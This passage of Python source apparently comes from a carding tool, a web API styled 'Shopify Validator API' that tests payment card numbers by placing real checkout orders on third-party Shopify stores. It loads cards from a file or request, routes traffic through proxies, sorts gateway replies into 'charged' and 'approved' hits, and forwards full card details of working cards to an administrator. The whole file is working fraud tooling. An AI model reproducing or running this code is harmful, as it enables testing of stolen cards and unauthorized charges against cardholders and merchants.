                            "handle": delivery_strategy, "customDeliveryRate": False
                        },
                        "options": {"phone": phone},
                    }
                    submit_deliv_line["expectedTotalPrice"] = {"any": True}

                    submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                    for ml in submit_merch.get("merchandiseLines", []):
                        ml["expectedTotalPrice"] = {"any": True}

                    return {
                        "query": MUTATION_SUBMIT,
                        "variables": {
                            "input": {
                                "sessionInput":       {"sessionToken": sst},
                                "queueToken":         queue_token or "",
                                "discounts":          {"lines": [], "acceptUnexpectedDiscounts": True},
                                "delivery": {
                                    "deliveryLines":              [submit_deliv_line],
                                    "noDeliveryRequired":         [],
                                    "useProgressiveRates":        True,
                                    "prefetchShippingRatesStrategy": None,
                                    "supportsSplitShipping":      True,
                                },
                                "merchandise":  submit_merch,
                                "payment": {
                                    "totalAmount": {"any": True},
                                    "paymentLines": [{
                                        "paymentMethod": {
                                            "directPaymentMethod": {
                                                "paymentMethodIdentifier": payment_identifier,
                                                "sessionId":               token,
                                                "billingAddress":          billing_addr,
                                                "cardSource":              None,
                                            }
                                        },
                                        "amount": {"any": True},
                                        "dueAt": None,
                                    }],
                                    "billingAddress": billing_addr,
                                },
                                "buyerIdentity":      copy.deepcopy(deliv_vars["buyerIdentity"]),
                                "taxes": {
                                    "proposedAllocations":         None,
                                    "proposedTotalAmount":         {"any": True},
                                    "proposedTotalIncludedAmount": None,
                                    "proposedMixedStateTotalAmount": None,
                                    "proposedExemptions":          [],
                                },
                                "tip":                {"tipLines": []},
                                "note":               {"message": None, "customAttributes": []},
                                "localizationExtension": {"fields": []},
                                "nonNegotiableTerms": None,
                                "optionalDuties":     {"buyerRefusesDuties": False},
                                **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                            },
                            "attemptToken": attempt_token,
                            "metafields": [],
                            "analytics": {"requestUrl": checkout_url},
                        },
                        "operationName": "SubmitForCompletion",
                    }

                s_resp: dict = {}
                for submit_attempt in range(3):
                    try:
                        sr = await session.post(
                            graphql_url,
                            params={"operationName": "SubmitForCompletion"},
                            headers=gql_headers,
                            json=_build_submit_body(),
                        )
                        s_resp = orjson.loads(sr.content)
                        _sub_sst = sr.headers.get("x-checkout-one-session-token")
                        if _sub_sst:
                            sst = _sub_sst
                            gql_headers["x-checkout-one-session-token"] = sst
                    except (asyncio.TimeoutError, RequestsError):
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r("TIMEOUT")
                    except Exception as ex:
                        log.debug("submit exception: %s", ex)
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r("SUBMIT_FAILED")

                    s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                    if not s_data:
                        errs = s_resp.get("errors") or []
                        if errs:
                            for err_item in errs:
                                for fld in ("code", "message"):
                                    val = str(err_item.get(fld) or "").upper()
                                    if val:
                                        norm = _normalize_response(val)
                                        if norm != "CARD_DECLINED":
                                            approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                                            if owned:
                                                res = session.close()
                                                if asyncio.iscoroutine(res): await res
                                            return _r(norm, approved=approved)
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r("GRAPHQL_ERROR")

                    stype = s_data.get("__typename", "")

                    if stype == "SubmitRejected":
                        sub_errs = s_data.get("errors") or []
                        all_confirmable = all(
                            e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs
                        ) if sub_errs else False
                        if all_confirmable and submit_attempt < 2:
                            await asyncio.sleep(0.5)
                            continue
                    break

                stype = s_data.get("__typename", "")

                if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = s_data.get("receipt") or {}
                    rtype   = receipt.get("__typename", "")

                    if rtype == "ProcessedReceipt":
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r("ORDER_PLACED", charged="True", approved="True")
                    
                    if rtype == "ActionRequiredReceipt":
                        action = receipt.get("action") or {}
                        reason = (action.get("challengeType") or 
                                  action.get("__typename") or 
                                  action.get("offsiteRedirect") or 
                                  "OTP_OR_REDIRECT")
                        if "CompletePaymentChallenge" in str(reason):
                            reason = "OTP Required"
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r(f"3DS_REQUIRED ({reason})", approved="True")
                    
                    if rtype == "FailedReceipt":
                        pe      = receipt.get("processingError") or {}
                        pe_type = pe.get("__typename", "")
                        if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                            if owned:
                                res = session.close()
                                if asyncio.iscoroutine(res): await res
                            return _r("NO_PRODUCT")
                        if pe_type == "OrderCreationFailure":
                            if owned:
                                res = session.close()
                                if asyncio.iscoroutine(res): await res
                            return _r("ORDER_CREATION_FAILED")
                        code = str(pe.get("code") or "").upper()
                        msg  = str(pe.get("messageUntranslated") or "").upper()
                        raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                        norm = _normalize_response(raw)
                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r(norm, approved=approved)

                    rid = receipt.get("id")
                    if rid:
                        poll_body = {
                            "query":         QUERY_POLL,
                            "variables":     {"receiptId": rid, "sessionToken": sst},
                            "operationName": "PollForReceipt",
                        }
                        await asyncio.sleep(2)
                        for _ in range(6):
                            try:
                                pr = await session.post(
                                    graphql_url,
                                    params={"operationName": "PollForReceipt"},
                                    headers=gql_headers,
                                    json=poll_body,
                                )
                                pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                                pt = pd.get("__typename", "")
                                
                                if pt == "ProcessedReceipt":
                                    if owned:
                                        res = session.close()
                                        if asyncio.iscoroutine(res): await res
                                    return _r("ORDER_PLACED", charged="True", approved="True")
                                
                                if pt == "ActionRequiredReceipt":
                                    action = pd.get("action") or {}
                                    reason = (action.get("challengeType") or 
                                              action.get("__typename") or 
                                              action.get("offsiteRedirect") or 
                                              "OTP_OR_REDIRECT")
                                    if "CompletePaymentChallenge" in str(reason):
                                        reason = "OTP Required"
                                    if owned:
                                        res = session.close()
                                        if asyncio.iscoroutine(res): await res
                                    return _r(f"3DS_REQUIRED ({reason})", approved="True")
                                
                                if pt == "FailedReceipt":
                                    pe      = pd.get("processingError") or {}
                                    pe_type = pe.get("__typename", "")
                                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                                        if owned:
                                            res = session.close()
                                            if asyncio.iscoroutine(res): await res
                                        return _r("NO_PRODUCT")
                                    code = str(pe.get("code") or "").upper()
                                    msg  = str(pe.get("messageUntranslated") or "").upper()
                                    raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                                    norm = _normalize_response(raw)
                                    approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                                    if owned:
                                        res = session.close()
                                        if asyncio.iscoroutine(res): await res
                                    return _r(norm, approved=approved)
                                
                                if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                    delay = pd.get("pollDelay", 3000) / 1000
                                    await asyncio.sleep(min(delay, 4))
                                    continue
                            except Exception:
                                pass
                            break

                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("CARD_DECLINED")

                if stype == "SubmitFailed":
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r(_normalize_response(str(s_data.get("reason") or "")))

                if stype == "SubmitRejected":
                    errs = s_data.get("errors") or []
                    if errs:
                        best_code = "CARD_DECLINED"
                        for err_item in errs:
                            for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                        "localizedMessageHtml"):
                                val = str(err_item.get(fld) or "").upper()
                                if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
                                                      "PAYMENT ERROR"):
                                    continue
                                norm = _normalize_response(val)
                                if norm != "CARD_DECLINED":
                                    best_code = norm
                                    break
                            if best_code != "CARD_DECLINED":
                                break
                        approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                           "3DS_REQUIRED") else "False"
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r(best_code, approved=approved)
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("CARD_DECLINED")

                if stype == "Throttled":
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("THROTTLED")
                if stype == "CheckpointDenied":
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("CHECKPOINTDENIED")

                if owned:
                    res = session.close()
                    if asyncio.iscoroutine(res): await res
                return _r("CARD_DECLINED")

            except (asyncio.TimeoutError, RequestsError) as ex:
                if owned:
                    res = session.close()
                    if asyncio.iscoroutine(res): await res
                err_msg = str(ex).lower()
                if outer_attempt < max_retries - 1:
                    await asyncio.sleep(0.5 * (outer_attempt + 1))
                    continue
                if "proxy" in err_msg or "tunnel" in err_msg:
                    return _r(f"PROXY_ERROR: {str(ex)[:100]}")
                return _r(f"TIMEOUT: {str(ex)[:100]}")
            except Exception as ex:
                if owned:
                    res = session.close()
                    if asyncio.iscoroutine(res): await res
                return {
                    "Response": "ERROR",
                    "CC":       f"{cc}|{month}|{year}|{cvv}",
                    "Price":    price,
                    "Gate":     gateway,
                    "Site":     ourl,
                    "Charged":  "False",
                    "Approved": "False",
                    "Time":     f"{round(time.time() - t0, 2)}s",
                    "Detail":   f"{type(ex).__name__}: {str(ex)[:100]}",
                }
            finally:
                if owned:
                    res = session.close()
                    if asyncio.iscoroutine(res):
                        await res

    return _r("MAX_RETRIES_EXCEEDED")


# ---------------------------------------------------------------------------
# Valid gateway response codes (site is live)
# ---------------------------------------------------------------------------
LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED",
})


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.get("/shopify")
async def shopify_route(
    site:  str           = Query(..., description="Shopify store URL"),
    cc:    Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    key:   Optional[str] = Query(None, description="API Key"),
):
    """Validate a card against a Shopify store checkout."""
    secret = os.environ.get("SHOPII_API_KEY", "GHOSTXOWNER!!!")
    if key != secret:
        return JSONResponse({"error": "Unauthorized API key. Please pass valid &key=... parameter"}, status_code=401)
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        card = random.choice(cards)

    result = await validate_card(
        card["cc"], card["month"], card["year"], card["cvv"],
        site, proxy_str=proxy,
    )
    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1

    if result.get("Charged") == "True" or result.get("Approved") == "True":
        status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
        cc_str = result.get("CC", f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}")
        asyncio.ensure_future(send_hit_to_admin(
            card=cc_str,
            status=status_label,
            response=result.get("Response", ""),
            gateway=result.get("Gate", "UNKNOWN"),
            price=result.get("Price", "0.00"),
            site=site,
        ))

    return JSONResponse(result)


@app.get("/check")
async def check_route(
    site:  str           = Query(..., description="Shopify store URL to check"),
    card:  Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    key:   Optional[str] = Query(None, description="API Key"),
):
    secret = os.environ.get("SHOPII_API_KEY", "DARKANONSHO!!!")
    if key != secret:
        return JSONResponse({"error": "Unauthorized API key. Please pass valid &key=... parameter"}, status_code=401)
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        parsed = random.choice(cards)

    site = site.strip()
    ourl = site if site.startswith("http") else f"https://{site}"

    best, candidates, err = await _fetch_products(ourl, proxy)
    if not best:
        reason = "DEAD_SITE"
        if err == "THROTTLED":
            reason = "THROTTLED"
        elif err and ("PROXY_ERROR" in err or "TIMEOUT" in err or "NETWORK_ERROR" in err):
            reason = err
        elif err and "No products" in err:
            reason = "NO_CHEAP_PRODUCTS"
        return JSONResponse({
            "valid":    reason in ("NO_CHEAP_PRODUCTS", "THROTTLED", "Timeout"),
            "site":     site,
            "reason":   reason,
            "detail":   err or f"No products in ${MIN_PRICE:.2f}–${MAX_PRICE:.2f} range",
        })

    chosen     = random.choice(candidates) if candidates else best
    variant_id = chosen["variant_id"]

    result = await validate_card(
        parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
        ourl, variant_id=variant_id, proxy_str=proxy,
    )

    response_code = result.get("Response", "")
    _stats[f"response_{response_code or 'UNKNOWN'}"] += 1

    is_dead_site = False
    if response_code in ("SITE_DEAD", "CAPTCHA_REQUIRED", "INVALID_SITE", "NOT_SUPPORTED"):
        is_dead_site = True
    elif any(k in response_code.lower() for k in ("domain not found", "could not resolve", "name or service not known")):
        is_dead_site = True

    if result.get("Charged") == "True" or result.get("Approved") == "True":
        status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
        cc_str = result.get("CC", f"{parsed['cc']}|{parsed['month']}|{parsed['year']}|{parsed['cvv']}")
        asyncio.ensure_future(send_hit_to_admin(
            card=cc_str,
            status=status_label,
            response=response_code,
            gateway=result.get("Gate", "UNKNOWN"),
            price=chosen["price"],
            site=site,
        ))

    return JSONResponse({
        "valid":         not is_dead_site,
        "site":          site,
        "product":       chosen["title"],
        "price":         chosen["price"],
        "card_response": response_code,
        "gate":          result.get("Gate", "UNKNOWN"),
        "approved":      result.get("Approved", "False"),
        "charged":       result.get("Charged", "False"),
        "time":          result.get("Time", ""),
    })


@app.get("/health")
async def health_route():
    cards  = _get_cards()
    return JSONResponse({
        "status":           "ok",
        "cards_loaded":     len(cards),
        "workers":          WORKERS,
        "pool_size":        POOL_SIZE,
        "pool_per_host":    POOL_PER_HOST,
        "site_concurrency": SITE_CONCURRENCY,
        "connect_timeout":  CONNECT_TIMEOUT,
        "request_timeout":  REQUEST_TIMEOUT,
        "cache_ttl":        CACHE_TTL,
        "max_price":        MAX_PRICE,
    })


@app.get("/stats")
async def stats_route():
    return JSONResponse(dict(_stats))


@app.post("/cache/clear")
async def cache_clear_route():
    count = len(_product_cache)
    _product_cache.clear()
    return JSONResponse({"cleared": count})


@app.post("/reload")
async def reload_route():
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})


# ---------------------------------------------------------------------------
# Middleware: per-request timing header + stats
# ---------------------------------------------------------------------------
@app.middleware("http")
async def add_timing(request: Request, call_next):
    t0   = time.time()
    resp = await call_next(request)
    resp.headers["X-Response-Time"] = f"{(time.time() - t0)*1000:.1f}ms"
    _stats["total_requests"] += 1
    path = request.url.path
    _stats[f"requests_{path.strip('/').replace('/', '_') or 'root'}"] += 1
    return resp


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(
        f"\n{'='*60}\n"
        f"  Shopify Validator API  v3.1\n"
        f"  Port:            {PORT}\n"
        f"  Workers:         {WORKERS}\n"
        f"  Pool:            {POOL_SIZE} total / {POOL_PER_HOST} per host\n"
        f"  Site concurrency:{SITE_CONCURRENCY}\n"
        f"  Product cache:   {int(CACHE_TTL)}s TTL\n"
        f"  Price range:     ${MIN_PRICE:.2f} – ${MAX_PRICE:.2f}\n"
        f"  Cards file:      {CARDS_FILE}\n"
        f"{'='*60}\n"
    )
    _loop = "asyncio" if sys.platform == "win32" else "uvloop"
    _workers = WORKERS if sys.platform != "win32" else 1
    uvicorn.run(
        "api:app",
        host="0.0.0.0",
        port=PORT,
        workers=_workers,
        loop=_loop,
        http="httptools",
        log_level="warning",
        access_log=False,
        timeout_keep_alive=65,
        limit_concurrency=10000,
        limit_max_requests=500_000,
        backlog=8192,
    )
